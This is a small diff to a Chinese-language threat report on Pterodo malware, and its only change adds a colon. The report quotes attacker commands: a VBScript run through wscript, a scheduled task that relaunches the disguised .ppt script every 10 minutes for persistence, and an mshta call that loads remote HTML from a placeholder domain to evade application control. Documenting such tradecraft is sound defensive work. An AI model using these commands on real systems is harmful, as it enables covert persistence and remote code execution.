@@ -8,7 +8,7 @@
 
 >	"CSIDL_SYSTEM\wscript.exe" CSIDL_PROFILE\appdata\local\temp\deep-thoughted. //e:VBScript //b
 
-然后会创建计划任务来确保持久性SCHTASKS /CREATE /sc minute /mo 10 /tn "deep-thoughted" /tr "wscript.exe " CSIDL_COMMON_PICTURES\deep-thoughted.ppt //e:VBScript //b" /F，该计划任务每10分钟运行一次.
+然后会创建计划任务来确保持久性:SCHTASKS /CREATE /sc minute /mo 10 /tn "deep-thoughted" /tr "wscript.exe " CSIDL_COMMON_PICTURES\deep-thoughted.ppt //e:VBScript //b" /F，该计划任务每10分钟运行一次.
 当然，该组织也会使用MSHTA来绕过应用程序控制策略:"CSIDL_SYSTEM\cmd.exe" /c CSIDL_SYSTEM\mshta.exe http://域名/FILM.html /f id=[REDACTED].
 
 2. 投递的Pterodo恶意软件活跃时将会通过其他的命令控制器下载脚本和工具，然后创建计划任务.
